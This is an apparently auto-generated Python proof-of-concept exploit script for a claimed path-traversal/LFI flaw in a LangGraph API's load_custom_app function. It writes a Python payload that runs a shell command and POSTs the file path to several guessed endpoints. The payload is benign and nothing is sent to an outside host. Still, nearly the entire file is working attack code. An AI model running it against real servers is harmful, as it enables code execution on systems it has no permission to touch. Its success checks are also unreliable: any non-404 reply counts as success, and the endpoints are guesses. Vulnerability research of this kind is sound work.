#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-029
# Sink: load_custom_app
# Auto-generated — run with: python3 lfi_there_validation_prevent_traversal_load_custom_app.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: LFI via app_import in langgraph_api_src

Vulnerability: The load_custom_app function accepts an app_import string from
external callers (public API). It splits on ':' to get path and name, then uses
path directly in os.path.isfile(path) and importlib.util.spec_from_file_location(path).
No validation prevents path traversal (e.g., '../') or absolute paths.

Impact: An attacker can import arbitrary Python files from the filesystem,
leading to local file inclusion (LFI) and potentially remote code execution.

This PoC demonstrates the vulnerability by:
1. Creating a benign Python file in /tmp that executes a harmless command
2. Sending a request to the vulnerable API endpoint with a path traversal payload
3. Verifying the payload was executed

Usage:
    python3 poc.py [--target http://localhost:8000]
"""

import argparse
import os
import sys
import tempfile
import time
import requests

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"


def create_payload_file():
    """
    Create a benign Python file that will be imported via the LFI vulnerability.
    The file creates a marker file to prove code execution.
    """
    payload_code = '''
import os
# Benign payload: create a marker file to prove code execution
os.system("touch /tmp/poc_success.txt")
print("POC: Successfully executed payload via LFI!")
'''

    # Write payload to a temporary file
    payload_path = os.path.join(tempfile.gettempdir(), "poc_payload.py")
    with open(payload_path, "w") as f:
        f.write(payload_code)
    
    print(f"[+] Created payload file at: {payload_path}")
    return payload_path


def exploit(target_url, payload_path):
    """
    Exploit the LFI vulnerability by sending a crafted app_import parameter.
    
    The vulnerable endpoint is typically at /api/v1/custom-app or similar.
    We send the path to our payload file as the app_import parameter.
    """
    # The app_import format is "path:name" where path is the file path
    # and name is the attribute to import from the module
    # We use "app" as the name since our payload defines a simple module
    app_import = f"{payload_path}:app"
    
    # Try common API endpoints that might use load_custom_app
    endpoints = [
        "/api/v1/custom-app",
        "/api/custom-app",
        "/custom-app",
        "/api/v1/app",
        "/api/app",
    ]
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        print(f"[*] Trying endpoint: {url}")
        
        try:
            # Send POST request with app_import parameter
            response = requests.post(
                url,
                json={"app_import": app_import},
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:200]}")
            
            # Check if we got a response (even an error means the code was executed)
            if response.status_code != 404:
                print(f"[+] Got non-404 response from {endpoint}")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection error - target may be down")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout")
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    return False


def verify_exploit():
    """
    Verify that the payload was executed by checking for the marker file.
    """
    marker_path = "/tmp/poc_success.txt"
    if os.path.exists(marker_path):
        print(f"[+] SUCCESS! Marker file found at: {marker_path}")
        print("[+] The payload was executed, confirming LFI vulnerability")
        # Clean up marker file
        os.remove(marker_path)
        return True
    else:
        print("[-] Marker file not found - payload may not have executed")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI vulnerability in langgraph_api_src"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload-path",
        help="Path to custom payload file (optional, creates one by default)"
    )
    
    args = parser.parse_args()
    
    print("[*] LangGraph API LFI Proof-of-Concept")
    print(f"[*] Target: {args.target}")
    print()
    
    # Create or use payload file
    if args.payload_path:
        payload_path = args.payload_path
        print(f"[*] Using custom payload: {payload_path}")
    else:
        payload_path = create_payload_file()
    
    print()
    print("[*] Attempting to exploit LFI vulnerability...")
    print("[*] The payload will create /tmp/poc_success.txt if successful")
    print()
    
    # Attempt the exploit
    exploit_success = exploit(args.target, payload_path)
    
    print()
    print("[*] Checking for payload execution...")
    time.sleep(1)  # Give the server time to process
    
    # Verify exploit
    verified = verify_exploit()
    
    print()
    if verified:
        print("[+] VULNERABILITY CONFIRMED: LFI via app_import parameter")
        print("[+] The load_custom_app function allows arbitrary file imports")
        print("[+] This can be escalated to RCE by importing malicious Python files")
    else:
        print("[-] Could not confirm vulnerability")
        print("[*] Possible reasons:")
        print("  - Target is not running the vulnerable version")
        print("  - API endpoint is different from expected")
        print("  - Server may have additional protections")
        print("  - Try with --target pointing to the actual API server")
    
    # Clean up payload file
    if not args.payload_path:
        try:
            os.remove(payload_path)
            print(f"[*] Cleaned up payload file: {payload_path}")
        except:
            pass


if __name__ == "__main__":
    main()
